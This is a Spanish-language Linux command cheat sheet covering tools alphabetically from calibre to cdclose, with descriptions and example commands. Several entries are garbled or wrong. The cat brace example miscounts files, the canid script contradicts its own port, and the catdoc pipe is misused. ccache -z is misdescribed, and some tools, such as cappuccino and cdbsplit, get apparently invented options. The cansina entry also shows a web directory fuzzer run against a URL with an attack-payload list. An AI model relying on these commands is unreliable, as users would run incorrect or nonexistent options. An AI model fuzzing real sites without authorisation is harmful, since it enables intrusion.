$ calibre-debug --diff arcchivo1 archivo2 (compara diferencias entre los dos ficheros)
$ calibre-server --listen-on 127.0.0.1
$ calibredb list (llistado libros)
$ calibredb add libro (añadir al listado)
$ ebook-meta libro.epub (verificar si un archivo EPUB es válido)
$ ebook-meta -a Juan Perez & Manuel Gomez -c "Libro de la naturaleza" -d 22/2/2025 -l es -t "Naturaleza" archivo.epub (escribe los autores, un comentario, fecha de publicación, lenguaje y título)
$ ebook-viewer --continue libro (continuar leyendo el último libro abierto)


calife
Alternativa ligera a Sudo. Permite a los usuarios seleccionados obtener un shell con la identidad de root u otro usuario, después de ingresar su propia contraseña. Esto permite al administrador del sistema otorgar privilegios de root sin compartir la contraseña.
$ califa
En /etc/calife.auth añadir el/los usuario/s y el shell que se les autoriza:
usuario:/bin/bash


callaudiod
Demonio que se encarga de gestionar el enrutamiento de audio entre diferentes aplicaciones y dispositivos. Proporciona una interfaz D-Bus que permite a otros programas: cambiar los perfiles de audio, enviar audio al altavoz o de vuelta a su puerto original y silenciar el micrófono. Algunos de estos controles pueden ser gestionados por alsamixer. El paquete contiene el demonio y la definición de la interfaz D-Bus y su configuración en /etc/asound.conf o en ~/.asoundrc
$ ps aux | grep callaudiod (verificar el estado)
$ cat /var/log/audio.log (ver el registro de eventos de audio)
$ aplay -D plughw:1 ~/ (redirigir el audio de una aplicación)
$ cat /proc/asound/card0/pcm0p/sub0/status (verificar el estado de un dispositivo de audio)
# systemctl restart pulseaudio (reiniciar la aplicación)
$ pacmd list-sinks (verificar los dispositivos de audio disponibles)
Nota.- En sistemas modernos, callaudiod es parte del sistema PulseAudio, que ha reemplazado a otros sistemas como ALSA.


calypso
Servidor caldav [estándar de Internet que permite a un cliente acceder a información de planificación en un servidor remoto.] escrito en Python que almacena calendarios y contactos en repositorios git. Cada colección reside en su propio repositorio git.
Configuración básica:
$ nano ~/.config/calypso/config
       [DEFAULT]
       host = localhost
       port = 5232
       storage = ~/docs/calendarios
       umask = 0077
       git = true
host: Dirección donde se ejecutará el servidor por ejemplo, localhost o una IP, port: Puerto en el que escuchará el servidor, storage: Ruta donde se almacenarán los calendarios/contactos y git: Habilita el almacenamiento en repositorios Git.
$ calypso --config ~/.config/calypso/config (pondrá a calypso en marcha y estará disponible en http://localhost:5232)
1.-
Ejemplo de crear un calendario o repositorio
$ mkdir -p ~/docs/calendarios/my_calendar
cd ~/docs/calendarios/my_calendar
git init
Al habilitar Git, cualquier cambio realizado en este calendario se almacenará en el historial de Git. Puede conectar cualquier cliente CalDAV compatible como Thunderbird, Evolution o aplicaciones de calendario en dispositivos móviles, al servidor de calypso en el que se estará ejecutando en http://localhost:5232 y el calendario se llama my_calendar, la URL para el cliente sería:
             http://localhost:5232/my_calendar
Cuando se haga cambios en un calendario, por ejemplo, añadir o editar eventos, calypso automáticamente los registra en el repositorio Git asociado.
$ git log (en el directorio my_calendar para ver el historial)
2.-
Para configurar autenticación básica en el archivo de configuración de calypso.
$ nano ~/.config/calypso/config
Añadir:
        [DEFAULT]
        auth = true
        users = ~/users/usuarios.txt
El archivo de usuarios debe contener líneas en el formato: username:password


cancel
Cancelar trabajos de impresión
$ cancel -u usuario  (del usuario especificado)
$ cancel -a  (todos los trabajos)


canid
Herramienta que proporciona una API HTTP simple para consultar información relacionada con nombres de dominio, direcciones IP, números de sistemas autónomos [ASN] y otros datos relacionados con el ecosistema de Internet. Por defecto, CanID escucha en http://localhost:8043.
# systemctl start canid (con el servicio en ectivo, en el navegador se coloca el dato a averiguar)
$ curl http://localhost:8043/domain/example.com (con herramientas como curl se puede interactuar con la API)
$ curl http://localhost:8043/ip/8.8.8.8 (consultar información sobre una IP)
$ curl http://localhost:8043/asn/15169 (consultar información de un ASN)
$ curl http://localhost:8043/tlds (consultar TLD disponibles)
1.-
Ejemplo de script para consultar direcciones IP de un archivo;
$ nano dirs.sh
       #!/bin/bash
       while read -r ip; do
         curl -s "http://localhost:8080/ip/$ip" | jq
       done < ips.txt
Este script toma direcciones IP de un archivo llamado ips.txt y devuelve la información en formato JSON utilizando jq para formatear la salida.


cansina
Trata de descubrir directorios ocultos en los que poder encontrar información útil. Descarga:
$ git clone https://github.com/deibit/cansina
# python cansina.py -h (Ayuda)
# python cansina.py -u URL -p fuzzdb/attack-payloads/all-attacks/all-attacks-unix.txt (Los parámetros mínimos son la URL y el peyload a usar)
Una vez lanzado el fuzzer, crea un archivo .sqlite en el directorio data que puede convertirse en .html con:
$ python viewer.py -p data/URL.sqlite
Y visualizarse en cualquier navegador.


canto
Lector de noticias rss. Configuración en .canto/conf.py para abrir las noticias con firefox, modificar la linea: link_handler("firefox \"%u\"")
$ canto -i archivo.opml (Entrar archivo de fuentes)
Atajos:
	j / k (Bajar / subir por las fuentes)
	g (Abrir noticia en el navegador para firefox)
	. / , (Siguiente / anterior noticia sin leer)
	space	 (abrir noticia)
	q (salir)
	r (marcar fuente como leída)
	R (marcar todas las fuentes como leídas)
	u (Volver a marcar fuente como no leída)
	U (Volver a marcar todas las fuentes como no leídas)
	Ctrl + r (Actualizar fuentes)
	f (Buscar palabra en las noticias)


capistrano
Automatizar tareas a través de SSH en servidores remotos, como instalación de software, implementación de aplicaciones, administración de configuración, monitoreo de servidores ad hoc y más.
$ cap install (crear un nuevo proyecto)
$ cap custom:check_disk (ejecuta la tarea en todos los servidores configurados en Capfile o en /lib/capistrano/tasks/custom_tasks.rake)
$ cap production deploy (para configurar los servidores y rutas en config/deploy.rb)
$ cap nginx:restart (reiniciar un servicio. Tiene que estar establecido en la configuración)
$ cap commands:execute (ejecutar un comando en múltiples servidores. Tiene que estar establecido en la configuración)
$ cap production deploy --trace (modo verbose para obtener más detalles)


cappuccino
Ejecute este software en su computadora cuando no esté motivado para trabajar y disfrute haciendo algo diferente. Este comando es un programa de distracción diseñado para ayudar a las personas a tomar pausas y reducir el tiempo de concentración durante el trabajo.
$ cappuccino --auto-start --threshold 50 --activity-type games (ejecutar automáticamente cuando la productividad disminuya)
$ cappuccino --duration 30m --activity-type videos (ejecutar durante un tiempo específico)
$ cappuccino --auto-start --threshold 60 --activity-type games,puzzles,music (configurar múltiples actividades)
1.-
Un ejemplo de archivo de configuración básico podría ser:
# nano ~/.config/cappuccino/config.yml
auto_start: true
threshold: 50
duration: 15m
activities:
 - games
 - puzzles
 - music


capsh
Permita probar y explorar el uso de capabilities. [relacionado con getcap, setcap y getpcaps]
$ capsh --print (Lista de capabilities actuales)


capstans
Herramienta para recopilar estadísticas sobre la carga actual de una interfaz de red.
$ capstans -i eth1 -I 2 (actualizar cada 2 segundos)
$ capstans -l (Imprimir resultados en syslog y no por pantalla)


capstats
Herramienta para recopilar estadísticas sobre la carga actual de una interfaz de red, ya sea mediante libpcap o la interfaz nativa de Endace. Informa estadísticas por intervalo de tiempo o por el tiempo de ejecución total de la herramienta.
$ capstats captura.pcap (con un archivo captura.pcap generado por herramientas como tcpdump, se puede analizar el tráfico)
$ capstats -m captura.pcap (mostrar estadísticas en megabytes por segundo [Mbps])
$ capstats -s 2 captura.pcap (estadísticas en intervalos de 2 segundos)
$ tcpdump -i eth0 -w - | capstats - (redirige el tráfico capturado por tcpdump directamente a capstats para analizarlo)


caracteres-especiales
Son signos con un caracter especial en bash:
	~ (Directorio home)
	` (Sustitución de comando)
	# (Comentario)
	$ (Variable)
	& (Proceso en background)
	; (Separador de comandos)
	* (Comodín para cero o cualquier número de caracteres)
	? (Comodín para un sólo carácter)
	/ (Separador de directorios)
	( (Empezar un subshell)
	) (Terminar un subshell)
	\ (Carácter de escape)
	< (Redirigir la entrada)
	> (Redirigir la salida)
	| (Tuberia)
	[ (Empieza conjunto de caracteres comodín)
	] (Acaba conjunto de caracteres comodín)
	{ (Empieza un bloque de comando)
	} (Acaba un bloque de comando)
	' (Entrecomillado fuerte)
	" (Entrecomillado débil)
	! (No lógico de código de terminación)


caracteres-unicode
Unicode es un estándar de codificación de caracteres diseñado para facilitar el tratamiento informático, transmisión y visualización de textos de múltiples lenguajes y disciplinas técnicas, además de textos clásicos de lenguas muertas.
Para insertarlos en un texto o en la consola, debe mirarse el código lanzando la aplicación charmap, seleccionar la grafía, latin en este ajemplo, clicar la letra correspondiente y en la parte inferior de la ventana nos aparecerá el código U+004D LATIN CAPITAL LETTER M [Letra M]. Vamos al texto y lo insertamos pulsando la combinación de teclas Ctrl+Shift+u y pulsando sucesivamente los números y letras 0,0,4,D. Al soltar las teclas Ctrl,Shift,u, pulsar espacio o intro aparecerá la letra M. También  puede consultarse la tabla <http://www.unicode.org/charts/> para encontrar el código que queremos representar.


cardctl
Utilidad para ordenadores portátiles de control de tarjetas PCMCIA [Tarjetas de memoria que permiten añadir al ordenador nuevas funciones, tales como tarjetas de sonido, de red...]
# cardctl status (Muestra el estado)
# cardctl config (Muestra la configuración)
# cardctl ident (Muestra información)
# cardctl suspend (Interrumpe la alimentación de la tarjeta)
# cardctl eject (La desactiva)
# cardctl insert (La activa nuevamente)


carddav
Protocolo similar a CalDAV, pero diseñado específicamente para la gestión de contactos entre servidor [Radicale, Nextcloud, OwnCloud] y cliente [Thunderbird, Evolution]. También se basa en WebDAV y permite el acceso y la gestión de datos de contactos almacenados en un servidor.


care
Supervisa la ejecución del comando especificado para crear un archivo que contiene todo el material necesario para volver a ejecutarlo en el mismo contexto. De esa manera, el comando será reproducible en todas partes, incluso en sistemas Linux que se supone que no son compatibles con el sistema Linux original.
$ care -o contexto-ls.tar ls /etc (crea un archivo contexto-ls.tar que contiene todo lo necesario para ejecutar el comando ls /etc en otro sistema)
$ care -v -o contexto-apache.tar apachectl start (modo detallado de captura del contexto necesario para iniciar Apache, lo que incluye los archivos de configuración utilizados y cualquier otro recurso accedido durante la ejecución)
1.-
Supongamos que se tiene un script llamado mi_script.sh que depende de variables de entorno y archivos específicos:
$ care -o contexto-script.tar ./mi_script.sh
El archivo contexto-script.tar contendrá lass variables de entorno usadas durante la ejecución y los archivos abiertos o modificados por el script.


cargo
Gestor de paquetes del lenguaje Rust. Crea el directorio ~/.cargo.
$ cargo install paquete (instalar un paquete)
$ cargo --list (listado de todos los comandos)
$ cargo help clean (información sobre un comando)


case
El conjunto de palabras case ... esac conforman un selector en función de un resultado.
Algunos ejemplos:
1.-
	#!/bin/bash
	read -p "Pon un número del 1 al 3 " NUM
	case $NUM in
		1)
		  echo "uno"
		;;
		2)
		  echo "dos"
		;;
		3)
		  echo "tres"
		;;
		*)
		  echo "No es del 1 al 3"
		;;
	esac
2.-
Combinado con un while para crear un menú:
	#!/bin/bash
	while [ "$OPCION" != 3 ]
	do
	echo
	echo "[1] ¿Saber el host? "
	echo "[2] ¿Directorio dondo estás? "
	echo "[3] Salir "
	echo
	read -p "Escoger una opción " OPCION
	echo
	case $OPCION in
		1)
		    echo $HOSTNAME
		;;
		2)
		    pwd
		;;
		3)
		    echo "Abortando..."
		;;
		*)
		    echo "La opción no es válida"
		exit
		;;
	esac
	done


cat
Muestra el archivo especificado
$ cat -n .bashrc (Numera las lineas de salida)
$ cat -b .bashrc (Sólo numera las lineas no vacias)
$ cat -s .bashrc (Suprime varias lineas vacias por una sola)
$ cat -A archivo (Ver los caracteres no imprimibles)
$ cat file{0..4} > archivo (Junta file1, file2, file3 y file4 en un sólo archivo)
$ cat file1 file2 file3 file4 archivo (Lo mismo)
Algunos archivos importantes usando cat:
$ cat /proc/cpuinfo       (informacion del procesador)
$ cat /var/log/debug | less	 (inf del sistema)
$ cat /var/log/user.log | less		 (inf del usuario)
$ cat /var/log/messages | less	 (mensajes del sistema)
$ cat /var/log/syslog | less 		 (registro de actividad)
$ cat /var/log/auth.log | less       (accesos al sistema)
$ cat /proc/meminfo	(inf sobre la memoria)
$ cat /proc/devices	 (inf sobre los dispositivos en uso)
$ cat /proc/mounts    (inf de las particiones y recursos montados)
$ cat /proc/filesystems	 (los filesystems habilitados en el kernel)
$ cat /etc/X11/default-display-manager (para conocer el gestor de sesiones)
$ cat /proc/version        (version del nucleo y compilador empleado)
$ cat < /sys/class/net/eth1/address (Muestra la dirección MAC)
$ cat /etc/services | grep http (Visualizar puertos por los que corre http)
$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | sed 1q (generar una contraseña de 10 caracteres)
$ cat listado.txt / | sed -e :a -e 's/^.\{1,20\}$/&_/;ta'  (coloca los nombres del listado uno detrás de otro y completa hasta 20 caracteres [1,10] con un guión bajo [&_])
$ cat /proc/$(ps -o ppid= -p $$ | tr -d ' ')/comm (muestra el nombre de la terrminal que está corriendo: lsterminal, tilda, kitty...)


catatonic
Proceso de inicialización para contenedores de aplicaciones. Este sistema está diseñado para simplificar la administración de contenedores de aplicaciones y mejorar la eficiencia en el arranque y su ejecución.
# catatonic list (listar todos los contenedores)
# catatonic status (mostrar el estado actual de todos los contenedores gestionados)
# catatonic start <nombre_del_contenedor> (iniciar un contenedor específico por su nombre o ID)
# catatonic stop <nombre_del_contenedor> (parar un contenedor)
# catatonic restart <nombre_del_contenedor> (reiniciar)
# catatonic remove <nombre_del_contenedor> (eliminar un contenedor)
# catatonic inspect <nombre_del_contenedor> (mostrar detalles de un contenedor específico)


catdoc
Lee archivos Microsoft Word [.doc, .dot, .rtf y .xml]. y envía su contenido a la salida estándar como texto. Incluye las herramientas xls2csv [convierte formatos de hojas de cálculo de Excel] y catppt [utilidad para extraer información textual de archivos de PowerPoint]
$ catdoc archivo.doc (uso básico)
$ catdoc archivo.doc > contenido.txt (guardar el texto en contenido.txt)
$ head -n 10 | catdoc archivo.doc (mostrar solo las primeras 10 líneas del documento como texto sin formato)


catdvi
Herramienta para visualizar en texto plano archivos DVI [Device Independent] generados por LaTeX y otros procesadores de TeX.
$ catdvi archivo.dvi > contenido.txt (crea un archivo llamado `contenido.txt` con el contenido del archivo DVI)
$ catdvi archivo.dvi (visualizar el contenido en pantalla)
$ catdvi -p 5 -l 10 archivo.dvi (mostrar páginas de la 5 a la 10 del archivo DVI. También puede especificarse "-p 5:10")
$ catdvi -s archivo.dvi (ignora caracteres especiales)


catfishq
Herramienta diseñada para trabajar con archivos de secuencias FASTQ, un formato ampliamente utilizado en bioinformática para almacenar información sobre lecturas de secuencias de ADN. La herramienta permite concatenar e imprimir archivos FASTQ, ya sea comprimidos, por ejemplo, en formato GZIP o no.
$ catfishq archivo1 archivo2 archivo3 (concatena y imprime en la salida estándar los contenidos de los archivos especificados)
$ catfishq file1.fastq file2.fastq > combined.fastq (combined.fastq contendrá las secuencias de ambos archivos concatenadas en el mismo formato)
$ catfishq file1.fastq.gz file2.fastq.gz > combined.fastq (descomprime automáticamente los archivos, los concatena y los guarda en combined.fastq)
$ catfishq large1.fastq.gz large2.fastq.gz | gzip > combined.fastq.gz (concatena los archivos directamente y los comprime nuevamente en el formato GZIP)


catgirl
Cliente de terminal IRC [Internet Relay Chat] minimalista.
$ catgirl HOST


catimg
Ver imagenes ascii
$ catimg -r 2 imagen.png (con mejor resolución que -r 1)


catkin
Este paquete es parte de ROS [Robot Operating System - sistema operativo para robots] técnicamente se trata de un conjunto de bibliotecas y herramientas que ayudan a desarrollar aplicaciones de software para robots. Para usar Catkin, se necesita configurar un "workspace" [espacio de trabajo], que es una carpeta donde se gestionarán todos sus paquetes y la estructura básica es:
$ mkdir -p ~/catkin_ws/{src,build,devel,install}
$ cd ~/catkin_ws
En el que dentro del directorio raíz del espacio de trabajo se incluyan los directorios src [para el código fuente de los paquetes], build [para los archivos de construcción generados por Catkin], devel [para los archivos de desarrollo, librerías, scripts, etc.] y install [con los archivos instalados después de construir el workspace]
$ catkin_make (en el interior del directorio raiz, genera, si no estan, los directorios build y devel)
Para crear un nuevo paquete dentro del espacio de trabajo
$ cd ~/my_catkin_ws/src
$ catkin_create_pkg mi_robot std_msgs roscpp
Esto genera una estructura básica para el paquete mi_robot que depende de std_msgs y roscpp, crea un archivo de configuración CMakeList.txt para la construcción yotro package.xml con información sobre el paquete [nombre, descripción, dependencias, etc.].
Una vez creado un paquete o añadido código, se debe construir el espacio de trabajo para generar los binarios necesarios:
$ cd ~/my_catkin_ws
$ catkin_make
Que compila todos los paquetes en src/ y genera los archivos correspondientes en las carpetas build/ y devel/.
Después de construir el espacio de trabajo, se necesita configurar el entorno para poder ejecutar los nodos y scripts:
$ source ~/my_catkin_ws/devel/setup.bash (actualiza las variables de entorno para incluir los archivos generados por Catkin)
Si el paquete mi_robot tiene un nodo llamado controlador:
$ rosrun mi_robot controlador
Si se precisa agregar nuevas dependencias a un paquete, editar el archivo package.xml y agregar las nuevas dependencias. Por ejemplo:
      <depend>geometry_msgs</depend>
      <depend>sensor_msgs</depend>
Después, reconstruir el espacio de trabajo con catkin_make.
$ catkin_make


catman
[man-db]. Se utiliza para crear o actualizar un conjunto de páginas de manual preformateadas, conocidas como páginas cat. Estas páginas son versiones preprocesadas de las páginas de manual originales, que suelen estar en formato troff o similar y se almacenan en un formato que permite una visualización más rápida al usar el comando man. Normalmente las páginas de manual originales se encuentran en /usr/share/man o /usr/local/share/man para software instalado localmente y las páginas cat preformateadas en /var/cache/man.
# catman -v (preformatear todas las páginas de manual de todas las secciones disponibles en el sistema y en modo información detallada)
# catman 1 (actualizar las páginas de manual de la sección 1 [comandos de usuario])
# catman 1 8 (actualizar las secciones 1 y 8 [comandos de administración])
# catman -d (muestra información de depuración)
Nota.- El paquete man-db incluye un script que se ejecuta periódicamente para mantener las páginas cat actualizadas, normalmente en /etc/cron.daily/man-db.


cava
[C.A.V.A.]. Visualizador de audio de espectro de barras para la terminal Linux que utiliza ALSA, pulseaudio o búfer fifo para la entrada.
$ cava (mientras está sonando música son un clásico reproductor))


caveconverter
Software para convertir entre varios formatos de datos topográficos. Los formatos admitidos actualmente son: formatos escritos: Toporobot, Survex, Compass; formatos leídos: Survex, Pockettopo, dxf polilíneas y líneas
$ caveconverter survexfile.svx output.text s t (convertir datos Survex existentes al formato Toporobot para poder importarlos a PocketTopo)
$ caveconverter pdaexport.txt survexfile.svx p s lrud (convertir datos exportados desde PocketTopo al formato Survex, incluida la información LRUD de los gráficos)
$ caveconverter datafile.dxf survexfile.svx d s  (convertir datos del formato DXF al formato Survex)


cb-
[crunchbang-bin-scripts]. Conjunto de scripts propios de la distro crunchbang.
cb-exit (Lanza el dialogo de salida)
cb-welcome (script para reconfigurar el sistema. Arranca recien instalado el S.O)
cb-lock (protector de pantalla)


cbatticon
Muestra información sobre la batería, como su estado, porcentaje de carga y el tiempo restante, mediante un icono en la bandeja del sistema.


cbm
Muestra el trafico de red
# cbm


cbonsai
Crea bonsais en la consola.
$ cbonsai (estático)
$ cbonsai -l (lo va creando)
$ cbonsai -i (va mostrando varios bonsais)


cbootimage
Este paquete contiene dos programas para analizar la boot config table [bct - tabla de configuración de arranque] de dispositivos basados en SoC Tegra y para generar una nueva bct con un gestor de arranque adjunto. por ejemplo, u-boot, que se leerá para ser flasheado en un dispositivo de almacenamiento. La tabla de configuración de arranque se utiliza en el proceso de arranque inicial para configurar el controlador de memoria DRAM sdhci y también indica la posición del gestor de arranque.
$ cbootimage -i /ruta/a/imagen.bin -o bct.txt (analizar una imagen específica y mostrar información detallada)
$ cbootimage -i /ruta/a/imagen.bin --bct-only > bct_contents.txt (mostrar solo el contenido de la tabla BCT)
$ cbootimage -i magen1.bin imagen2.bin --compare-bct (comparar dos imágenes y mostrar las diferencias en la BCT)
$ cbootimage -i /ruta/a/imagen.bin --extract-info (extraer información específica de la BCT)
$ cbootimage --check-compatibility /ruta/a/imagen.bin (verificar si un dispositivo es compatible con cbootimage)


cbp2make
Herramienta diseñada para convertir archivos de proyectos o espacios de trabajo de Code::Blocks [un IDE para desarrollo en C y C++] en archivos Makefile compatibles con GNU Make.
$ cbp2make -in mi_proyecto.cbp (generará un archivo Makefile en el directorio actual)
$ cbp2make -in mi_proyecto.cbp -out /proyectos/mi_proyecto/ (el archivo Makefile se guardará en la ruta proporcionada)
$ make (después de generar el archivo Makefile, compila el proyecto con GNU Make)
Nota.- Si el proyecto tubiera múltiples configuraciones, por ejemplo, Debug y Release, se puede especificar al ejecutar make: make CONFIG=Release ; make CONFIG=Debug
$ cbp2make -in mi_workspace.workspace (genera un Makefile que incluye las reglas para construir todos los proyectos contenidos en el espacio de trabajo)
$ cbp2make -in mi_proyecto.cbp -v (ver más detalles sobre el proceso de conversión si el Makefile generado no funciona como se esperaba)


ccache
Es un caché de compiladores. Acelera la recompilación almacenando en caché compilaciones anteriores y detectando cuándo se vuelve a realizar la misma compilación.
$ ccache gcc -o ejecutable archivo.c (compila un archivo C usando 'gcc' y almacena la salida en el caché)
$ ccache -s (ver qué archivos están almacenados en el caché)
$ ccache -C (limpiar caché)
$ ccache -z mi_codigo.c (verificar si determinado archivo está en el cache)


ccal
Calendario colorizado
$ ccal -e (formato europeo: primer dia semana,  lunes)
$ ccal -e 3 2011 (mostrar el marzo de 2011)
$ ccal -a (formato americano: primer dia semana, domingo)
$ ccal -e 2011 (mostrar todo el 2011)


ccat
Como el comando cat pero con más colorido. Si se prefiere ccat a cat poner en ~/.bashrc la linea:
     alias cat=ccat
     $ source ~/.bashrc (recargar .bashrc)
Descarga:
     $ wget https://github.com/jingweno/ccat/releases/download/v1.1.0/linux-amd64-1.1.0.tar.gz
     $ tar xfz linux-amd64-1.1.0.tar.gz
     $ cd linux-amd64-1.1.0
     # cp linux-amd64-1.1.0/ccat /usr/local/bin/
$ ccat fichero1 fichero2 (abrir varios ficheros)
$ ccat fichero1 fichero2 --html > fichero.html (crear y guardar un html)
$ ccat --palette (colores disponibles)
$ ccat -G String="darkblue" -G Plaintext="darkred" -G Comment="green" archivo


ccd2iso
Convierte una imagen img/ccd/sub/cue a iso
$ ccd2iso imagen.img imagen.iso


ccdiff
busca diferencias entre dos archivos y muestra de distinto color las líneas cambiadas.
$ ccdiff --list-colors (ver todos los colores disponibles)
$ ccdiff -m -i -B file1 file2 (usando marcas en las diferencias [m], ignorando mayúsculas/minúsculas [i] y espacios en blanco [B])
Algunas opciones:
	--old=color
          Definir el color de primer plano para el texto eliminado.
        --new=color
          Definir el color de primer plano para el texto agregado.
        --bg=color
          Definir el color de fondo para el texto modificado


cclive
Herramienta de descarga de video para YouTube y otros sitios web de videos similares.
$ clive https://www.youtube.com/watch?v=VIDEO_ID (descarga básica de un video)
$ clive -S https://www.youtube.com/channel/CHANNEL_ID (consultar los flujos de medios disponibles)
$ cclive -s best https://www.youtube.com/channel/CHANNEL_ID (descargar el flujo de medios de mejor calidad)


ccrypt
Utilidad para poner contraseña a un archivos o directorios [sustituye el original].
$ ccrypt -e fichero   (poner contraseña, confirmar y convierte el fichero en fichero.cpt)
$ ccrypt -d fichero.cpt (abrirlo)
$ ccrypt -c fichero.cpt (lo visualiza en consola. Como "cat")
$ ccrypt -x fichero.cpt (cambia la contraseña. Primero pide la contraseña, luego la nueva y confirmación)
$ ccrypt -er dir   (cifrar un directorio entero recursivamente)


ccze
Colorear la salida de un comando
$ cat /var/log/apache2/access.log | ccze -A


cd
Moverse a un directorio
$ cd     (entra al directorio personal estes donde estes)
$ cd ~   (entra al direcotorio personal estes donde estes)
$ cd ..  (baja un nivel)
$ cd ../.. (baja dos niveles)
$ cd -   (entra en el último directorio en el que se ha estado)


cd-discid
Para realizar consultas a traveés de internet sobre CDDB [CD Database] que es un servicio en línea que contiene información sobre discos de audio, incluyendo títulos, artistas y pistas.
$ cd-discid /dev/cdrom/


cd-drive
[libcdio-utils]. Describe las características de la unidad de CD-ROM/DVD.
$ cd-drive


cd-paranoia
Herramienta para extraer pistas de audio de discos compactos [CDs] en formato CDDA [Compact Disc Digital Audio]. Permite leer directamente el disco óptico sin necesidad de un sistema operativo o software de lectura de CD integrado. Esto lo hace útil para recuperar datos de CDs antiguos o dañados.
$ cd-paranoia (forma básica estando en el directorio del CD [/media/cdrom])
$ cd-paranoia -vb -C 0x41 (modo detallado, saltarse errores de lectura y código de error específico)
$ cd-paranoia -B (extraer todas las pistas de un CD)
$ cd-paranoia -t 5 (extraer una pista específica)
$ cd-paranoia -V (verificación de datos)


cd5
Herramienta para verificar la integridad de un CD-ROM de múltiples pistas calculando el checksum MD5 y reportando el tamaño de cada pista. Esto permite asegurarse de que los datos en el CD-ROM no se hayan corrompido durante el proceso de grabación. La aplicación usa una ruta fija al dispositivo que actualmente es /dev/cdrom para acceder al CD-ROM, si el dispositivo está en otra ubicación, por ejemplo, /dev/sr0, se debe crear un enlace simbólico:
# ln -s /dev/sr0 /dev/cdrom
$ cd5 (verificar un CD-ROM, mostrando checksum y tamaño de cada pista en bytes)
      Track 01: MD5=abcdef1234567890abcdef1234567890  Size=12345678 bytes
      Track 02: MD5=1234567890abcdef1234567890abcdef  Size=98765432 bytes
      ...


cdargs
Herramienta que mejora la navegación por el sistema de archivos desde la shell. Se conecta al comando de CD a través de una función de shell o un alias y le agrega marcadores y un navegador que permite moverse a un lugar muy distante en el sistema de archivos con solo unas pocas pulsaciones de teclas.
$ cdargs -a path (agregar una ruta a la lista de marcadores)
$ cdargs -u user (ver los marcadores de un usuario. Para eliminar una entrada pulsar "d". Pulsar "q" para salir)
$ cdargs (si solo hay un usuario entra en su listado como en el caso anterior)
$ cv xxx (con las primeras letras y tab se entra en el directorio que se ha entrado en el listado)
$ ca (al entrar en un directorio y pulsar ca se incorpora el directorio en la lista de marcadores)
Para incorporar cdargs en .bashrc:
     cp /usr/share/doc/cdargs/examples/cdargs-bash.sh ~/.bashrc-cdargs
     echo '. ~/.bashrc-cdargs' >> ~/.bashrc


cdbackup
Utilidad específica para crear copias de seguridad de discos CD-R/W. Incluye la aplicación cdrestore [ver]
$ cdbackup /dev/cdrom backup.iso (copiar un disco CD a una imagen ISO)
$ cdbackup -v -b 2048M /dev/dvd backup_dvd.iso (copiar un disco DVD a una imagen ISO en modo verbose y tamaño máximo de cada bloque 2048)
$ cdbackup -s /dev/cdrom backup_data.iso (copiar solo los datos útiles sin estructura de directorios de un disco CD)


cdbs
[Common Debian Build System]. Sistema de compilación basado en Makefile y que proporciona un conjunto de reglas predeterminadas sobre las que se pueden compilar los paquetes. Su principal objetivo es reducir la cantidad de reglas que un mantenedor de paquetes necesita escribir en el archivo debian/rules. Para usar la aplicación, en el archivo debian/rules se incluye lo siguiente:
            #!/usr/bin/make -f
            include /usr/share/cdbs/1/rules/debhelper.mk
Esto carga un conjunto de reglas estándar de debhelper para la construcción del paquete. Si se está empaquetando un proyecto simple con un script de configuración basado en Autotools, se puede usar el módulo autotools.mk de cdbs. Este es un ejemplo de debian/rules:
           #!/usr/bin/make -f
           include /usr/share/cdbs/1/class/autotools.mk
           include /usr/share/cdbs/1/rules/debhelper.mk
autotools.mk maneja automáticamente los pasos de configuración, compilación e instalación usando ./configure, make, y make install y debhelper.mk gestiona tareas adicionales como la instalación de archivos de documentación. Si el paquete es un módulo de Python que utiliza distutils, el archivo debian/rules podría verse así:
           #!/usr/bin/make -f
           include /usr/share/cdbs/1/class/python-distutils.mk
           include /usr/share/cdbs/1/rules/debhelper.mk
El módulo python-distutils.mk compila el paquete de Python automáticamente usando setup.py. Si el proyecto usa CMake, puedes usar el módulo cmake.mk:
           #!/usr/bin/make -f
           include /usr/share/cdbs/1/class/cmake.mk
           include /usr/share/cdbs/1/rules/debhelper.mk
Esto maneja automáticamente la configuración (cmake), la compilación (make), y la instalación (make install). Se puede especificar documentación adicional en debian/docs:
            README.md
            CHANGELOG
            LICENSE
El contenido del archivo debian/rules no necesita cambiar para que estos archivos sean instalados en /usr/share/doc/<nombre-del-paquete>. Para crear los archivos de Debian se precisa: debian/control que define las dependencias del paquete, debian/changelog que registra los cambios y debian/rules que usa los módulos cdbs necesarios. Una vez creado el paquete para instalar el .deb:
# dpkg-buildpackage -us -uc
y verificar su funcionalidad.


cdbsplit
extrae partes de la base de datos de cookies a un archivo separado, por palabra clave, por tamaño, por número o grupos de cookies similares.
$ cdbsplit -k "cookie_name" cookie_database.db (extraer cookies por palabra clave creando archivos separados por cada valor de "cookie_name")
$ cdbsplit -s 1024 cookie_database.db (dividirá los cookies en archivos de hasta 1024 bytes)
$ cdbsplit -n 50 cookie_database.db (creará 50 archivos con igual número de cookies cada uno)
$ cdbsplit -g "domain" cookie_database.db (dividirá los cookies en grupos basados en su dominio)
$ cdbsplit -t "$(date +%Y-%m-%d)" cookie_database.db (creará archivos separados por fecha, usando la fecha actual como referencia)
$ cdbsplit -r 100-500 cookie_database.db (dividirá los cookies en archivos donde cada uno tenga entre 100 y 500 bytes)


cdcd
Utilidad para controlar reproductores de CD de música. Permite tanto comandos directos como un modo interactivo.
$ cdcd (la primera vez que se ejecuta hace algunas preguntas con el dispositivo reproductor /dev/cdrom y entra en modo interactivo)
$ cdcd play (empezar a reproducir un CD)
$ cdcd stop (detener la reproducción)
$ cdcd next (asvanzar a la siguiente pista)
$ cdcd prev (retroceder a la pista anterior)
$ cdcd track 4 (elegir una pista específica)
$ cdcd eject (expulsar el cd)
En modo interactivo los comandos son los mismo pero con el prompt de cdcd:
        $ cdcd
        > play
        > next
        > eject
1- Configurar una alarma con cron para que cdcd empiece a reproducir un CD a una hora específica, añadir una linea en contrab parecida a:
              0 7 * * * cdcd play
Este ejemplo haría que el CD comenzara a reproducirse todos los días a las 7:00 AM.


cdck
Herramienta de verificación de la calidad de CD/DVD.
$ cdck (verifica los sectores del disco y da un reporte indicando si hay sectores corruptos o ilegibles. Por defecto lo busca en /dev/cdrom)
$ cdck -i (obtener información del disco)
$ cdck -q (prueba de calidad más detallada y obtener un informe sobre cada sector)
$ cdck -d /dev/sr0 (si el no es el por defecto en /dev/cdrom, ha de especificarse)
$ cdck -f (forzar una lectura más agresiva de los sectores del disco)


cdclose
[cdtool]. Cerrar el cd.
